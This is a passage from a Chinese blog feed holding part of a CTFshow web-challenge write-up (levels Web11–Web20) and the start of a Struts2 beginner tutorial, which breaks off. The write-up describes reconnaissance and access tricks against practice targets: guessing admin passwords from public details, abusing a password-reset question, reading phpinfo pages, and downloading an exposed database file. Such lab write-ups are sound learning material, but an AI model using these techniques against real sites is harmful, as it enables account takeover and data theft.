title="Web11"></a>Web11</h2><h3 id="考点-域名txt记录泄露"><a href="#考点-域名txt记录泄露" class="headerlink" title="考点: 域名txt记录泄露"></a>考点: 域名txt记录泄露</h3><blockquote><p>题目描述：域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息</p></blockquote><p>在线DNS域名解析，即可得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://whois.chinaz.com/<br>http://www.jsons.cn/nslookup/<br>https://zijian.aliyun.com/<br></code></pre></td></tr></table></figure><h2 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h2><h3 id="考点-敏感信息公布"><a href="#考点-敏感信息公布" class="headerlink" title="考点: 敏感信息公布"></a>考点: 敏感信息公布</h3><blockquote><p>题目描述：有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问后台地址admin，管理员账号admin，在网页底找到了电话号码，猜测是密码</p><h2 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h2><h3 id="考点-内部技术文档泄露"><a href="#考点-内部技术文档泄露" class="headerlink" title="考点: 内部技术文档泄露"></a>考点: 内部技术文档泄露</h3><blockquote><p>题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>在网页底部找到一个doucument链接。得到后台地址<code>/system1103/login.php</code>和帐号密码</p><h2 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h2><h3 id="考点-编辑器配置不当"><a href="#考点-编辑器配置不当" class="headerlink" title="考点: 编辑器配置不当"></a>考点: 编辑器配置不当</h3><blockquote><p>题目描述：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>访问url/editor，发现一个网页自带的编辑器,点击上传图片，可以看到文件目录，/var/www/html/nothinghere 中有一个fl000g.txt，访问<code>/nothinghere/fl000g.txt</code>即可得到flag</p><h2 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h2><h3 id="考点-密码逻辑脆弱"><a href="#考点-密码逻辑脆弱" class="headerlink" title="考点: 密码逻辑脆弱"></a>考点: 密码逻辑脆弱</h3><blockquote><p>题目描述：公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>在底部找到邮箱信息，访问后台地址/admin，用户名admin ，选择忘记密码。查找到邮箱qq所在地为西安，返回修改后的密码，登录即可得到flag。</p><h2 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h2><h3 id="考点-探针泄露"><a href="#考点-探针泄露" class="headerlink" title="考点: 探针泄露"></a>考点: 探针泄露</h3><blockquote><p>题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>访问/tz.php，看下PHP参数,点击phpinfo超链接，在phpinfo页面搜索ctfshow即可</p><h2 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h2><h3 id="考点-CDN穿透"><a href="#考点-CDN穿透" class="headerlink" title="考点: CDN穿透"></a>考点: CDN穿透</h3><blockquote><p>题目描述：透过重重缓存，查找到ctfer.com的真实IP，提交 flag{IP地址}</p></blockquote><p>根据hint提示，直接ping <a href="http://www.ctfshow.com得到ip地址111.231.70.44/">www.ctfshow.com得到IP地址111.231.70.44</a></p><h2 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h2><h3 id="考点-js敏感信息泄露"><a href="#考点-js敏感信息泄露" class="headerlink" title="考点: js敏感信息泄露"></a>考点: js敏感信息泄露</h3><blockquote><p>题目描述：不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>查看源码，发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/Flappy_js.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>访问/js/Flappy_js.js查看Flappy_js.js文件，发现了一段编码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span>(score&gt;<span class="hljs-number">100</span>)<br>&#123;<br><span class="hljs-keyword">var</span> result=<span class="hljs-built_in">window</span>.confirm(<span class="hljs-string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Unicode解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">你赢了，去幺幺零点皮爱吃皮看看<br></code></pre></td></tr></table></figure><p>访问/110.php即可</p><h2 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h2><h3 id="考点-前端密钥泄露"><a href="#考点-前端密钥泄露" class="headerlink" title="考点: 前端密钥泄露"></a>考点: 前端密钥泄露</h3><blockquote><p>题目描述：密钥什么的，就不要放在前端了</p></blockquote><p>查看源码，前端含有注释代码，泄露了用户名和密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    error_reporting(0);</span><br><span class="hljs-comment">    $flag=&quot;fakeflag&quot;</span><br><span class="hljs-comment">    $u = $_POST[&#x27;username&#x27;];</span><br><span class="hljs-comment">    $p = $_POST[&#x27;pazzword&#x27;];</span><br><span class="hljs-comment">    if(isset($u) &amp;&amp; isset($p))&#123;</span><br><span class="hljs-comment">        if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123;</span><br><span class="hljs-comment">            echo $flag;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">    --&gt;</span><br></code></pre></td></tr></table></figure><p>输入用户名和密码提示不正确，用Post提交</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<br></code></pre></td></tr></table></figure><h2 id="WEB-20"><a href="#WEB-20" class="headerlink" title="WEB 20"></a>WEB 20</h2><h3 id="考点-数据库恶意下载"><a href="#考点-数据库恶意下载" class="headerlink" title="考点: 数据库恶意下载"></a>考点: 数据库恶意下载</h3><blockquote><p>题目描述：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>早期asp+access架构的数据库文件为db.mdb，直接查看url路径添加加/db/db.mdb下载文件，用记事本打开搜索flag即可。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTFshow靶场 Web入门系列&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="信息泄露" scheme="http://atkx.top/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
    <category term="CTFshow" scheme="http://atkx.top/tags/CTFshow/"/>
    
  </entry>
  
  <entry>
    <title>Struts2框架入门</title>
    <link href="http://atkx.top/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
    <id>http://atkx.top/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</id>
    <published>2021-03-19T12:26:02.000Z</published>
    <updated>2021-05-06T10:32:42.307Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：Struts2框架学习笔记（一）</p> <a id="more"></a><h1 id="Struts2框架入门"><a href="#Struts2框架入门" class="headerlink" title="Struts2框架入门"></a>Struts2框架入门</h1><h2 id="Struts2简介"><a href="#Struts2简介" class="headerlink" title="Struts2简介"></a>Struts2简介</h2><blockquote><p>Struts2是一种基于MVC模式的轻量级Web框架，Struts2是Struts1的下一代产品，是在Struts1和WebWork技术的基础上进行合并后的全新框架</p></blockquote><p>struts2框架其实是对javaWeb表现层的MVC作了优化</p><h2 id="Struts2的优点"><a href="#Struts2的优点" class="headerlink" title="Struts2的优点"></a>Struts2的优点</h2><p>1、项目开源，使用及拓展方便，天生优势。<br>2、提供Exception处理机制。<br>3、Result方式的页面导航，通过Result标签实现页面跳转。4<br>4、通过简单、集中的配置来调度业务类，方便修改。<br>5、提供简单、统一的表达式语言来访问所有可供访问的数据。<br>6、提供标准、强大的验证框架和国际化框架。<br>7、提供强大的、可以有效减少页面代码的标签。<br>8、提供良好的Ajax支持。<br>9、拥有简单的插件，可以扩展Struts2框架。<br>10、拥有智能的默认设置，不需要另外进行繁琐的设置。</p><h2 id="Struts2入门案例"><a href="#Struts2入门案例" class="headerlink" title="Struts2入门案例"></a>Struts2入门案例</h2><h3 id="第一步：下载jar包"><a href="#第一步：下载jar包" class="headerlink" title="第一步：下载jar包"></a>第一步：下载jar包</h3><p>下载地址：<a href="https://struts.apache.org/">https://struts.apache.org/</a></p><p>选择struts-2.3.37-all.zip 下载<br><img src="https://img-blog.csdnimg.cn/20210318221037734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>下载解压后，出现以下界面,struts-2.3.37的目录结构：<br><img src="https://img-blog.csdnimg.cn/20210318221245199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>由于struts的jar包并不全部需要，找到apps目录下struts2-blank.war</p><p><img src="https://img-blog.csdnimg.cn/20210318221723429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压struts2-blank.war，将示例程序lib目录下的jar包添加到我们项目中即可，此版本的Struts2项目必需的13个jar包。<br><img src="https://img-blog.csdnimg.cn/20210318221628262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第二步：创建项目导入jar包"><a href="#第二步：创建项目导入jar包" class="headerlink" title="第二步：创建项目导入jar包"></a>第二步：创建项目导入jar包</h3><p>创建项目，将上面的13个jar包粘贴到lib中，然后build path，会在Web App Libraries中看到<br><img src="https://img-blog.csdnimg.cn/20210319193907712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第三步：配置web-xml"><a href="#第三步：配置web-xml" class="headerlink" title="第三步：配置web.xml"></a>第三步：配置web.xml</h3><p>编辑web应用的web.xml配置文件，配置struts2的核心拦截器。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee </span></span><br><span class="hljs-tag"><span class="hljs-string"> http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--配置Struts2核心过滤器--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第四步：创建Action类"><a href="#第四步：创建Action类" class="headerlink" title="第四步：创建Action类"></a>第四步：创建Action类</h3><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="第五步：创建struts-xml文件"><a href="#第五步：创建struts-xml文件" class="headerlink" title="第五步：创建struts.xml文件"></a>第五步：创建struts.xml文件</h3><p>引入dtd约束，该代码可以在WebContent\WEB-INF\lib\struts2-core-2.3.37.jar找到<br><img src="https://img-blog.csdnimg.cn/20210319195632426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <span class="hljs-comment">&lt;!-- 配置Action --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- 配置result结果页面跳转 --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- 指定Struts2配置文件的D2T信息 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Struts2的Action必须放在指定的包空间下定义 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>解决Struts2的配置文件struts.xml文件无提示问题</strong><br>struts.xml文件提示来自DTD约束：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>方法1：电脑可以上网，会自动访问<code>http://struts.apache.org/dtds/struts-2.3.dtd</code>，提供提示功能<br>方法2: 配置本地DTD提示<br>首先需要找到我们的struts核心jar包<code>struts2-core-2.3.30.jar</code>，然后我们需要将它解压，可以看到<code>struts-2.3.dtd</code>文件<br><img src="https://img-blog.csdnimg.cn/2021032319251158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择window  –&gt; preferences  –&gt;  搜索xml  –&gt;  选择xml Catalog<br><img src="https://img-blog.csdnimg.cn/20210323192626738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>  Location：点击File System，添加刚才解压ruts2-2.3.dtd文件路径。</li><li>   Key type ：选择URI</li><li>  key：<a href="http://struts.apache.org/dtds/struts-2.3.dtd">http://struts.apache.org/dtds/struts-2.3.dtd</a><br><img src="https://img-blog.csdnimg.cn/20210323192722238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击应用，重新打开struts.xml编辑，会得到提示<br><img src="https://img-blog.csdnimg.cn/20210323193147877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h3 id="第六步：创建jsp文件"><a href="#第六步：创建jsp文件" class="headerlink" title="第六步：创建jsp文件"></a>第六步：创建jsp文件</h3><p>index.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2入门案例<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2入门案例<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath &#125;/helloWorld.action&quot;</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2跳转页面<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2跳转页面成功<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="第七步：部署项目"><a href="#第七步：部署项目" class="headerlink" title="第七步：部署项目"></a>第七步：部署项目</h3><p>发布项目，点击超链接<br><img src="https://img-blog.csdnimg.cn/20210319201030489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跳转成功<br><img 